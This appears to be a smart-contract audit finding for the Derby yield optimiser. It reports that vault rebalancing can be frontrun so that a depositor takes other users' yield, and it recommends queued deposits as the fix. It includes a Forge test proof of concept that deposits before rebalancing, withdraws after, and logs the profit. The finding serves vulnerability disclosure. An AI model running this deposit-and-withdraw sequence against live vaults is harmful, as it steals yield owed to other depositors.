Bobface

high

# Vault rebalancing can be frontrun to steal yield

## Summary
Users can frontrun the vault's rebalancing process to steal yield generated by other users.

## Vulnerability Detail
[`MainVault`](https://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/MainVault.sol)'s reblancing is a multi-step process starting with a call to [`pushTotalUnderlyingToController`](https://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/MainVault.sol#L249) when a [certain amount of time](https://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/Vault.sol#L428) has passed since the last rebalancing. During the rebalancing process, the [`exchangeRate` is updated](https://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/MainVault.sol#L296) to include the yields generated since the last rebalancing. 

A malicious user can frontrun the call to `pushTotalUnderlyingToController` and mint a large amount of shares through [`deposit()`](https://github.com/sherlock-audit/2023-01-derby/blob/main/derby-yield-optimiser/contracts/MainVault.sol#L106) for the **old exchange rate**, wait for the rebalancing process which starts immediately afterwards to complete, and then immediately withdraw the funds at the **new, increased exchange rate** to steal the yield generated by the other users.

## Impact
Yield which has been generated by normal users over the period between two rebalancings can be stolen without risk by an attacker.

## Tool used

Manual Review

## Recommendation
The most common solution to this issue is to queue deposits. When a user makes a deposit, he does not immediately get shares minted, but instead his deposit is queued and only executed **after** the next rebalancing is complete. This way, deposited funds only get activated in the next period, avoiding the issue of depositing exactly before the period ends while still getting credited yield pro-rata.


## Code Snippet
The PoC is implemented as Forge test. To run it, 
1. [Install Foundry](https://github.com/foundry-rs/foundry#installation) if you have not already done so
2. In the `derby-yield-optimiser` directory, paste the following content into `foundry.toml`:
```toml
[profile.default]
src = 'contracts'
out = 'out'
libs = ['lib']

# See more config options https://github.com/foundry-rs/foundry/tree/master/config
```
3. Run `forge init --force --no-commit`. You can ignore the git error it displays.
4. Run `forge install openzeppelin/openzeppelin-contracts --no-commit`. Again, ignore the git error.
5. Paste the following content into `remappings.txt`:
```txt
hardhat/=lib/forge-std/src
@openzeppelin/=lib/openzeppelin-contracts/
```
6. Paste the Solidity code below into `test/Frontrun.t.sol`.
7. Finally, to run the PoC, execute `forge test -m testFrontrun -vv`. You should see this output:
```txt
Running 1 test for test/Frontrun.t.sol:FrontrunTest
[PASS] testFrontrun() (gas: 9964618)
Logs:
  Made a profit of 4 tokens
```

Code:

```solidity
pragma solidity ^0.8.11;

import "../contracts/MainVault.sol";
import "../contracts/Interfaces/IController.sol";

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract FrontrunTest is Test {
    ERC20 token;
    MainVault vault;

    User badUser;
    User someNormalUsers;

    // The amount normal users have deposited in total
    // before the bad user deposits
    uint256 NORMAL_USERS_DEPOSIT = 10 ether;
    // The amount the bad user deposits
    uint256 BAD_USER_DEPOSIT = 100 ether;
    // The amount of yield the normal users generated
    // *before* the bad user deposits.
    uint256 YIELD = 5 ether;

    function main() internal {
        // ENTRY POINT
        // Runs the main PoC after the environment has been set up.
        
        // Normal users deposit
        someNormalUsers.deposit(NORMAL_USERS_DEPOSIT);

        // They generate yield over time
        vm.roll(10_000);
        vm.warp(10_000 * 12);
        deal(address(token), address(vault), YIELD);

        // The vault can be rebalanced.
        // The bad user frontruns the start of the rebalancing process
        // by depositing funds into the vault.
        badUser.deposit(BAD_USER_DEPOSIT);

        // The rebalancing process is immediately started after the bad user's deposit.
        // During this process nobody can enter or exit the pool.
        uint256 exchangeRate = 
            ((NORMAL_USERS_DEPOSIT + BAD_USER_DEPOSIT + YIELD) * 1e18) /
            (NORMAL_USERS_DEPOSIT + BAD_USER_DEPOSIT);
        vault.pushTotalUnderlyingToController();
        vault.setXChainAllocation(0, exchangeRate, false);
        vault.receiveProtocolAllocations(new int256[](0));
        vault.rebalance();
        vault.sendRewardsToGame();

        // Immediately after the rebalancing process is complete,
        // the bad users withdraws all funds, making a profit.
        badUser.withdrawAll();
        badUser.print();
    }

    function testFrontrun() external {
        // Create the token
        token = new ERC20("TOKEN", "TOKEN");

        // Create the vault
        vault = new MainVault(
            "VAULT",
            "VAULT",
            18,
            1,
            address(this),
            address(0),
            address(this),
            address(token),
            1e18
        );

        // Set this contract as XProvider
        vault.setHomeXProvider(address(this));

        // Create the users
        badUser = new User(token, vault);
        someNormalUsers = new User(token, vault);

        // Execute main
        main();
    }

    // ----------------------------------------------
    // --- XProvider Mock
    function pushTotalUnderlying(
    uint256 _vaultNumber,
    uint32 _chainId,
    uint256 _underlying,
    uint256 _totalSupply,
    uint256 _withdrawalRequests
    ) external payable {}

    function pushRewardsToGame(
    uint256 _vaultNumber,
    uint32 _chainId,
    int256[] memory _rewards
  ) external payable {}

    // ----------------------------------------------
    // --- Controller Mock
    function latestProtocolId(uint256 _ETFnumber) external view returns (uint256) {
        return 0;
    }
}

contract User is Test {
    ERC20 token;
    MainVault vault;

    uint256 deposited;

    constructor(ERC20 _token, MainVault _vault) {
        token = _token;
        vault = _vault;

        token.approve(address(vault), type(uint256).max);
    }

    function deposit(uint256 amount) external {
        deal(address(token), address(this), amount);
        deposited += vault.deposit(amount, address(this));
    }

    function withdrawAll() external {
        vault.withdraw(vault.balanceOf(address(this)), address(this), address(this));
    }

    function print() external {
        uint256 balance = token.balanceOf(address(this));
        console.log("Made a profit of %s tokens", (balance - deposited) / 1e18);
    }
}
```